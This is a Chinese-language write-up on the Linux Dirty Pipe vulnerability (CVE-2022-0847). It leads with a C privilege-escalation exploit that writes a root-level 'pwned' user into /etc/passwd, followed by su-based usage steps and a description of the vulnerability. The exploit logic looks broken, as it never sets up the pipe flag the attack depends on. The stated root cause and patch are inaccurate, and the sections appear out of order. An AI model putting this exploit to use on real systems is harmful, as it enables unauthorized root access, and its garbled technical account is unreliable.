/*
 * Dirty Pipe (CVE-2022-0847) 提权 exp
 * 编译: gcc -o dirtypipe dirtypipe.c -lpthread
 * 用法: ./dirtypipe
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/pipe_fs_i.h>

#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#endif

struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

int main(int argc, char **argv) {
    const char *target = "/etc/passwd";
    const char *username = "pwned";
    const char *password_hash = "$6$..."; // 需要预先计算密码哈希

    // 1. 打开目标文件
    int fd = open(target, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 2. 创建管道
    int p[2];
    if (pipe(p) < 0) {
        perror("pipe");
        return 1;
    }

    // 3. 使用 splice 从文件读取 1 字节到管道
    ssize_t n = splice(fd, NULL, p[1], NULL, 1, 0);
    if (n < 0) {
        perror("splice");
        return 1;
    }

    // 4. 关闭写端，然后重新打开写端（利用 /proc/self/fd/）
    close(p[1]);
    char fd_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", p[0]);
    p[1] = open(fd_path, O_WRONLY);
    if (p[1] < 0) {
        perror("open write end");
        return 1;
    }

    // 5. 构造新的 passwd 条目
    char new_entry[256];
    snprintf(new_entry, sizeof(new_entry), "%s:%s:0:0:root:/root:/bin/bash\n", username, password_hash);

    // 6. 写入管道，覆盖页缓存
    write(p[1], new_entry, strlen(new_entry));

    // 7. 清理
    close(fd);
    close(p[0]);
    close(p[1]);

    printf("[+] Exploit completed. Try 'su %s' to get root.\n", username);
    return 0;
}


**注意**：
- 上述代码需要 root 权限才能修改 `/etc/passwd`？实际上，Dirty Pipe 利用的是页缓存覆盖，不需要对文件有写权限，只需要读权限。但修改 `/etc/passwd` 后，系统可能会拒绝写入磁盘（因为文件是只读的），但页缓存中的修改会立即生效，直到下次文件被同步。因此，利用后需要立即使用 `su` 切换用户，然后通过 `passwd` 命令修改密码或直接使用 `sudo`。
- 实际利用中，需要预先计算一个密码哈希（如使用 `openssl passwd -6` 生成 SHA-512 哈希）。
- 该 exp 仅适用于受影响的 Linux 内核版本。

**修复**：升级内核到 5.16.11+ 或 5.15.25+。

Dirty Pipe漏洞（CVE-2022-0847）是Linux内核中pipe系统调用实现的一个漏洞，允许无特权的本地用户向任意只读文件中写入数据，包括root拥有的文件（如/etc/passwd），从而实现权限提升。

漏洞成因：Linux内核的pipe机制中，当使用splice()系统调用将数据从文件描述符移动到pipe时，内核会尝试重用pipe buffer中的页面。具体来说，在pipe_write()函数中，如果pipe buffer的页面是“未映射”的（即page->mapping为NULL），内核会直接使用该页面，而不检查该页面是否来自其他文件。攻击者可以通过精心构造的splice调用，将一个文件（如只读文件）的页面映射到pipe buffer中，然后通过pipe写入操作修改该页面，从而修改原始文件的内容。

关键点：漏洞存在于Linux 5.8到5.16.11、5.15.25、5.10.102之前的内核版本。漏洞函数是pipe_write()中的copy_page_from_iter()，它没有正确检查页面是否属于pipe的专用缓存，导致可以写入其他文件映射的页面。

受影响版本：Linux内核 5.8 - 5.16.11、5.15.25之前、5.10.102之前。

POC原理：攻击者打开一个只读文件（如/etc/passwd），通过splice()将其内容读取到pipe中，然后通过write()向pipe写入数据，覆盖pipe buffer中的页面。由于这些页面实际上指向原始文件的页缓存，因此写入操作会修改文件内容。

修复：内核补丁在pipe_write()中添加了检查，确保pipe buffer的页面必须是pipe专用的（即page->mapping指向pipe的address_space），否则重新分配页面。

代码示例（C语言POC，覆盖/etc/passwd添加新用户）：
